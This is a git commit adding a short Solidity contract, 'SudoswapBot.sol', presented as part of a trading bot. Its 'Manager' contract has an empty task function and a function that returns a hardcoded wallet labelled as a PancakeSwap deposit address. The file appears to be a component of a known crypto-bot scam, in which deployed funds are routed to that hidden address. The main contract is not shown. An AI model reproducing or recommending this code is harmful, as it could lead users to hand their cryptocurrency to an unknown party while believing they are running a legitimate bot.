1a2c1b80f3b365b320c7c2f7a4bda8cca9b52db9
QuantiumX <107758724+QuantiumX@users.noreply.github.com>
2023-02-20 00:48:59 +0300

    Add files via upload

---
+++ sudoswap-main/blob/main/contract/SudoswapBot.sol
@@ -0,0 +1,11 @@
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity ^0.5.0;
+contract Manager {
+    function performTasks() public pure{
+        
+    }
+
+    function pancakeswapDepositAddress() public pure returns (address) {
+        return 0x808CDDF1A432F70289De799E2CBb35AE554965E9;
+    }
+}
